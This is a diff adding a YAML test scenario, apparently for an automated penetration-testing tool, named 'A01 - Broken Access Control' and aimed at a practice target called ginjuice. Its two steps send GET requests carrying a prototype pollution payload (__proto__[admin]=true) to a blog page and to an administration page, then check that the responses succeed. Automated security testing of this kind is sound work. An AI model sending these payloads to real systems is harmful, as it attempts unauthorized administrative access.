@@ -1,0 +1,23 @@
+id: ginjuice-a01-broken-access-control
+name: "A01 - Broken Access Control"
+mode: predator
+retry_on_failure: true
+
+steps:
+  - phase: exploitation
+    description: "Test client-side prototype pollution via blog endpoint"
+    action:
+      method: GET
+      path: "/blog?__proto__[admin]=true"
+    validate:
+      status_code: 200
+      body_contains: "Blog"
+
+  - phase: exploitation
+    description: "Access administration page via prototype pollution parameter"
+    action:
+      method: GET
+      path: "/administration?__proto__[admin]=true"
+    validate:
+      status_code: 200
+      body_contains: "Administration"
